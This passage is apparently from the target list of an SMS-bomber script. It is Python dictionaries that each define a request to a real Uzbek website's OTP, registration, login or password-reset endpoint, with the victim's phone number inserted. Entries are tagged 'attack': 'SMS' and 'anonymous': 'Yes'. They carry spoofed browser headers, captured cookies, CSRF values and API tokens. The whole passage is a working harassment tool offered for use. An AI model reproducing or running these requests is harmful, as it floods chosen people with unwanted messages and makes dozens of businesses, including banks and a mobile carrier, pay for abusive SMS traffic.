            'headers': {'authority': 'kidsplate.uz', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'cookie': 'ASPRO_MAX_USE_MODIFIER=Y; BITRIX_SM_SALE_UID=77bdad7f15b2b94731607a36bf586182; PHPSESSID=3HZFgiRCC6zI75DN7G5q1mmDiUMn6Gz0; BITRIX_SM_TIME_ZONE=-300; _ym_debug=null; _ga=GA1.1.516838688.1679418390; _ym_uid=1679418789117736454; _ym_d=1679418789; _ym_visorc=w; _ym_isad=1; BX_USER_ID=c045334d95f90ada0e8a39134c7ca067; BITRIX_CONVERSION_CONTEXT_s2=%7B%22ID%22%3A3%2C%22EXPIRE%22%3A1679425140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ga_8D6WYL2H70=GS1.1.1679418389.1.1.1679419008.0.0.0', 'origin': 'https://kidsplate.uz', 'referer': 'https://kidsplate.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'USER_PHONE_NUMBER={number}&backurl=%2F&AUTH_FORM=Y&TYPE=AUTH&POPUP_AUTH=Y&AUTH_PHONE_OR_LOGIN={number}&Login=Y&Login1=Y',
            'params': {'login': 'yes',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'PharmaClick.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://pharmaclick.uz/bitrix/services/main/ajax.php?mode=class&c=infinity%3AauthBySMS&action=checkPhone',
            'headers': user_agent()[0],
            'data': {'phone': f'+{number}'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Radius.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.radius.uz/api/v2/otp',
            'headers': user_agent()[0],
            'json': {'phone_number': f'+{number}'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Octo.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://secure.octo.uz/sendAppURL',
            'headers': user_agent()[0],
            'json': {'phone': f'+{number}'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Click.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.click.uz/evo/',
            'json': {'jsonrpc': '2.0', 'id': '59723317-2664-4f2a-bcd0-35859fabe558', 'method': 'device.register.request', 'params': {'phone_number': number, 'device_info': user_agent()[1], 'device_name': 'Windows ', 'device_type': 3, 'imei': '541c2cf641186838e96b70cdbddb2e21', 'app_version': '1.0'}},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Kids-Planet.uz', 'anonymous': 'Yes'},
            'method': 'get',
            'url': f'https://kids-planet.uz/wp-admin/admin-ajax.php?action=send_otp&phone=+{number}',
            'data': {'action': 'send_otp', 'phone': number},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'ZFashion.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://zfashion.uz/api/v1/site/auth/sign-up',
            'json': {'gender': 'm', 'phone': str(number)[3:], 'password': 'LOCK-qwertty12345'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'FcnShop.uz', 'anonymous': 'Yes'},
            'method': 'get',
            'url': f'https://fcnshop.uz/wp-admin/admin-ajax.php?action=send_otp&phone=+{number}',
            'data': {'action': 'send_otp', 'phone': number},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Stock.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.podium.uz/v1/verify_phone',
            'headers': user_agent()[0],
            'json': {'data': {'phone': f'+{number}'}},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Lochin.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.lochin.uz/en/api/v1/e_commerce/register/',
            'headers': user_agent()[0],
            'json': {'username': f'+{number}'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'E-Auksion.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://auth.e-auksion.uz/api/auth/send-sms',
            'headers': user_agent()[0],
            'json': {'phone': f'+{number}', 'code': 'null', 'email': 'null', 'activation_method': 2},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'YSK.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://ysk.uz/register/form',
            'headers': user_agent()[0],
            'data': {'profile[firstName]': 'User', 'profile[lastName]': 'Name', 'profile[phoneNumber]': f'+{number}', 'password[first]': 'NMv-33y-ce7-eu2', 'password[second]': 'NMv-33y-ce7-eu2'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Rasta.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://client.api.rasta.app/v1/customers/register',
            'headers': user_agent()[0],
            'json': {'name': 'User Name', 'phone': f'+{number}', 'code': '', 'registration_source': 'website'},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Book.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://backend.book.uz/user-api/sign-up',
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Authorization': 'Bearer undefined', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://book.uz', 'Referer': 'https://book.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'language': 'ru', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'firstName': 'User', 'lastName': 'Name', 'phoneNumber': f'+{number}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'OqtepaLavash.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://customer.api.delever.uz/v1/customers/login',
            'headers': {'authority': 'customer.api.delever.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://oqtepalavash.uz', 'platform': 'website', 'referer': 'https://oqtepalavash.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'shipper': '36b00947-ad7a-40eb-b7ca-1c0ea267f2ac', 'user-agent': user_agent()[1],},
            'json': {'phone': f'+{number}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'YaponaMama.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.yaponamama.uz:3032/v1/register-code',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://yaponamama.uz', 'Referer': 'https://yaponamama.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'phone': number,},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'BurgerandLounge.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://horeca.ihoops.uz/api/v1/customer/confirm',
            'headers': {'authority': 'horeca.ihoops.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'api-token': '9fb865d19145b77f288bdf37a5fd7a07', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://burgerandlounge.uz', 'pl': 'b-app', 'project-key': 'AIU7LMEspeTthX2E', 'referer': 'https://burgerandlounge.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': user_agent()[1],},
            'json': {'phone': f'+{number}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Uzum.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.umarket.uz/api/signin/phone',
            'headers': {'authority': 'api.umarket.uz', 'accept': 'application/json', 'accept-language': 'ru-RU', 'access-content-allow-origin': '*', 'authorization': 'Basic YjJjLWZyb250OmNsaWVudFNlY3JldA==', 'origin': 'https://uzum.uz', 'referer': 'https://uzum.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': user_agent()[1], 'x-iid': '366a6d1f-4be8-482c-8d48-6fa87d99bda6',},
            'json': number,
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Shop.Tegen.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://shop.tegen.uz/wp-admin/admin-ajax.php',
            'headers': {'authority': 'shop.tegen.uz', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://shop.tegen.uz', 'referer': 'https://shop.tegen.uz/?login=true&page=1&redirect_to=https%3A%2F%2Fshop.tegen.uz%2F', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'action': 'digits_check_mob', 'countrycode': '+998', 'mobileNo': str(number)[3:], 'csrf': 'abcb909e0e', 'login': '2', 'username': '', 'email': '', 'captcha': '', 'captcha_ses': '', 'digits': '1', 'json': '1', 'whatsapp': '0', 'digits_reg_name': 'User', 'digits_reg_lastname': 'Name', 'digregcode': '+998', 'digits_reg_mail': str(number)[3:], 'dig_otp': '', 'code': '', 'dig_reg_mail': '', 'dig_nounce': 'abcb909e0e',},
            # Регистрация на номер по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Shop.Tegen.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://shop.tegen.uz/wp-admin/admin-ajax.php',
            'headers': {'authority': 'shop.tegen.uz', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://shop.tegen.uz', 'referer': 'https://shop.tegen.uz/?login=true&page=1&redirect_to=https%3A%2F%2Fshop.tegen.uz%2F', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'action': 'digits_check_mob', 'countrycode': '+998', 'mobileNo': str(number)[3:], 'csrf': 'abcb909e0e', 'login': '1', 'username': '', 'email': '', 'captcha': '', 'captcha_ses': '', 'digits': '1', 'json': '1', 'whatsapp': '0', 'mobmail': str(number)[3:], 'dig_otp': '', 'dig_nounce': 'abcb909e0e', 'digits_login_remember_me': '1', 'digits_redirect_page': 'https://shop.tegen.uz/',},
            # Вход по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Shampurik.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://shampurik.uz/auth/login',
            'headers': {'authority': 'shampurik.uz', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'checksum': '801', 'content-type': 'text/plain;charset=UTF-8', 'origin': 'https://shampurik.uz', 'referer': 'https://shampurik.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'data': '{"phone":"+' + str(number) + '","code":"","needCode":true,"meta":{"companySlug":""}}',
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Beeline.uz', 'anonymous': 'Yes'},
            'method': 'get',
            'url': f'https://beeline.uz/api/refill/args/auth/{number}/otp/send',
            'headers': {'authority': 'beeline.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'referer': 'https://beeline.uz/ru', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            # Отправка кода авторизации
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Beeline.uz', 'anonymous': 'Yes'},
            'method': 'get',
            'url': f'https://beeline.uz/restservices/api/a2/auth/{number}/otp/send',
            'cookies': {'_ym_uid': '167752299242631835', '_ym_d': '1677522992', 'phonePrefix': '+998', 'phoneMask': '9', '_gaexp': 'GAX1.2.b5WtyZ5HSj6Qo04XKuBfxA.19443.2', 'zone': 'tashkentskaya-obl', '_gid': 'GA1.2.1657935237.1677866697', '_ym_visorc': 'b', '_ym_isad': '1', 'language': 'ru', '_ga_LMRG19E8FQ': 'GS1.1.1677866696.2.1.1677866798.60.0.0', '_ga': 'GA1.1.1132917541.1677522993', '_ga_N837KGK1RT': 'GS1.1.1677866696.2.1.1677866869.0.0.0',},
            'headers': {'authority': 'beeline.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'referer': 'https://beeline.uz/ru', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            # Повторная отправка кода авторизации
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'OLX.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://uz.login.olx.com/api/forgot-password',
            'headers': {'authority': 'uz.login.olx.com', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://uz.login.olx.com', 'referer': 'https://uz.login.olx.com/forgot-password?client_id=2s42fsas18c0kbs55g4cpjccvf&code_challenge=FSR81u4QIMsUb0Ls6xCocOo1TKbor8q3YIsrdHWhYRo&code_challenge_method=S256&redirect_uri=https%3A%2F%2Fwww.olx.uz%2Faccount%2Fcallback%2F&st=eyJzbCI6IjE4NjFmZWVlN2I2eDY0YzA0NTEyIiwicyI6IjE4Njk0MzQ1MDY4eDZlZjg3YjljIiwiY2MiOjB9&state=eyJyZWZlcnJlciI6Imh0dHBzOlwvXC93d3cub2x4LnV6XC9teWFjY291bnRcLyJ9', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'username': f'+{number}', 'user_context_data': {'encoded_data': 'eyJwYXlsb2FkIjoie1wiY29udGV4dERhdGFcIjp7XCJVc2VyQWdlbnRcIjpcIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDguMC4wLjAgWWFCcm93c2VyLzIzLjEuMy45NDkgWW93c2VyLzIuNSBTYWZhcmkvNTM3LjM2XCIsXCJEZXZpY2VJZFwiOlwiMjVoeXVhZWd6eDRtOHN4OXQ0ZXI6MTY3NzUyMzc5MzY4M1wiLFwiRGV2aWNlTGFuZ3VhZ2VcIjpcInJ1XCIsXCJEZXZpY2VGaW5nZXJwcmludFwiOlwiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOC4wLjAuMCBZYUJyb3dzZXIvMjMuMS4zLjk0OSBZb3dzZXIvMi41IFNhZmFyaS81MzcuMzZQREYgVmlld2VyOkNocm9tZSBQREYgVmlld2VyOkNocm9taXVtIFBERiBWaWV3ZXI6TWljcm9zb2Z0IEVkZ2UgUERGIFZpZXdlcjpXZWJLaXQgYnVpbHQtaW4gUERGOnJ1XCIsXCJEZXZpY2VQbGF0Zm9ybVwiOlwiV2luMzJcIixcIkNsaWVudFRpbWV6b25lXCI6XCIwNTowMFwifSxcInVzZXJuYW1lXCI6XCIrOTk4OTA5MjE2Mzg3XCIsXCJ1c2VyUG9vbElkXCI6XCJcIixcInRpbWVzdGFtcFwiOlwiMTY3NzUyMzkyOTU4N1wifSIsInNpZ25hdHVyZSI6IjRaeCtOZk1Ra25CUFU1UXN6bER4UzAyTkpxNjdVUE5CUlh4U0FuSVFOM1U9IiwidmVyc2lvbiI6IkpTMjAxNzExMTUifQ==',},},
            'params': {'client_id': '2s42fsas18c0kbs55g4cpjccvf', 'st': 'eyJzbCI6IjE4NjFmZWVlN2I2eDY0YzA0NTEyIiwicyI6IjE4Njk0MzQ1MDY4eDZlZjg3YjljIiwiY2MiOjB9',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Asaxiy.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://asaxiy.uz/ajax/send-verification',
            'cookies': {'asaxiy': 'nimqqj5fp542dlerag60mhc5j9', '_csrf-asaxiy': 'd6a39638b87f958b73ea8bf0bda4ba9bb31211f37a04ae4c7486bfd470c7787fa%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22_csrf-asaxiy%22%3Bi%3A1%3Bs%3A32%3A%22-5LWYY9iv6YACJaQTVttCZ4T3aCy32HC%22%3B%7D', '_ym_uid': '1679821169851159599', '_ym_d': '1679821169', '_gcl_au': '1.1.591179095.1679821169', '_ga_Z4GYM0118P': 'GS1.1.1679821168.1.1.1679821169.59.0.0', '_ym_visorc': 'w', '_ga': 'GA1.2.1253478328.1679821169', '_gid': 'GA1.2.115936817.1679821170', '_gat': '1', '_gat_gtag_UA_61499039_1': '1', '_ym_isad': '1', 'referer': '40b47ad1752bd08e82ac7eaf73e4781f33c7bc274e2dda5ade971b71b63f0c49a%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22referer%22%3Bi%3A1%3Bs%3A18%3A%22https%3A%2F%2Fasaxiy.uz%2F%22%3B%7D',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://asaxiy.uz', 'Referer': 'https://asaxiy.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-CSRF-Token': 'y7B15MRESfvdoqA3TuPYz4GjZDTqeKJFAcn5Y7xPHOrmhTmznR1wkquU-XYNqbme1fUQQKkilhEyqLoaj31UqQ==', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'_csrf-asaxiy=y7B15MRESfvdoqA3TuPYz4GjZDTqeKJFAcn5Y7xPHOrmhTmznR1wkquU-XYNqbme1fUQQKkilhEyqLoaj31UqQ%3D%3D&LoginForm%5Bphone%5D={number}&LoginForm%5Bverification%5D=',
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Zon.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.zon.uz/auth/sign/up',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://account.zon.uz', 'Referer': 'https://account.zon.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'mobile': number, 'firstname': 'User', 'password': 'sfqydwu77737H',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Prizma.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://prizma.uz/customer/signup',
            'headers': {'authority': 'prizma.uz', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://prizma.uz', 'referer': 'https://prizma.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-csrf-token': 'hdW8JxdXNH3uQv8nIH8FmsA6-JxOJA-oze-zxf6LRxHfhIhFXmYBMJ4Sll12C1_I9le2pQV0TdqUoID3uvsXIQ==', 'x-requested-with': 'XMLHttpRequest',},
            'data': {'_csrf-frontend': 'hdW8JxdXNH3uQv8nIH8FmsA6-JxOJA-oze-zxf6LRxHfhIhFXmYBMJ4Sll12C1_I9le2pQV0TdqUoID3uvsXIQ==', 'SignupForm[username]': f'+{number}', 'SignupForm[password]': 'HyH-j5R-NuL-Wdf', 'SignupForm[password_repeat]': 'HyH-j5R-NuL-Wdf', 'SignupForm[step]': '0', 'SignupForm[code]': '',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'eSavdo.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://esavdo.uz/cabinet/check/phone',
            'cookies': {'_gcl_au': '1.1.387878339.1679822357', '_ym_uid': '1679822357425163370', '_ym_d': '1679822357', '_ym_isad': '1', '_ga': 'GA1.2.441273986.1679822357', '_gid': 'GA1.2.614661134.1679822357', '_gat_UA-115068878-2': '1', '_gat_gtag_UA_115068878_2': '1', '_ym_visorc': 'w', 'XSRF-TOKEN': 'eyJpdiI6IkZ1VnZQN21FQmdmY0FjK3UwSWtCdUE9PSIsInZhbHVlIjoiemZkS2JDZUFJYm1QT3UxZUFUV1pmNURyS0tnM3kxNzB1Vk9xakFKQm4yOWwwckRIMHg5WGw3Znp1YUJ1VG42cCIsIm1hYyI6ImUyMWRkMDFjZDA5NjQ2MmVkZGJlYzBlNmQ2MzQ5ZjYxOTkxMmJhMzIxMWEwMWMyYmQwYTNjZDVlMDJjMjRjYjcifQ%3D%3D', 'laravel_session': 'eyJpdiI6ImViUkZHak1GaHlhM2lQc0ZtK2xXdUE9PSIsInZhbHVlIjoidFJHdzYxTWYrWjB1NmNUQ09scmxxb2ZCRzdTaDNyMWpSMnhzaWlWTUw2NG9MYXJpVHE1XC9QdU9oak9RZjRyZ2ciLCJtYWMiOiJhMDkzOGRiMWE3MjUzODIwZWJhZmIzMzNkYTUwMWJmOTI1ZjA2ZDYyOTBmNTE4NTg4NDI4OTJmY2NiNjMwMmQzIn0%3D',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://esavdo.uz', 'Referer': 'https://esavdo.uz/cabinet/login', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'phone': f'+{number}', '_token': 'qrOlABTChETQddSJBjQtEgUpr80GenNjlYtUCSEB',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'JoyBox.uz', 'anonymous': 'Yes'},
            'method': 'get',
            'url': f'https://joybox.uz/wp-admin/admin-ajax.php?action=send_otp&phone=+{number}',
            'headers': {'authority': 'joybox.uz', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'referer': 'https://joybox.uz/my-account/orders/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'AsakaBank.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://back.asakabank.uz/individual/user-register/',
            'headers': {'authority': 'back.asakabank.uz', 'accept': 'application/json', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'authorization': '', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://asakabank.uz', 'referer': 'https://asakabank.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'username': username(), 'first_name': 'User', 'last_name': 'Name', 'father_name': 'Names', 'verification_type': 'phone', 'phone_number': number, 'password': 'FHDACdsuifsf9784',},
            # Регистрация по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'AsakaBank.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': f'https://back.asakabank.uz/resend/verification/{number}/',
            'headers': {'authority': 'back.asakabank.uz', 'accept': 'application/json', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'authorization': '', 'origin': 'https://asakabank.uz', 'referer': 'https://asakabank.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            # Повторная отправка смс при регистрации
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'AsakaBank.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://back.asakabank.uz/my/reset/password/',
            'headers': {'authority': 'back.asakabank.uz', 'accept': 'application/json', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'authorization': '', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://asakabank.uz', 'referer': 'https://asakabank.uz/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'phone_number': number,},
            # Восстановление пароля по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'UzumBank.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://mobile.apelsin.uz/api/check-user/sms',
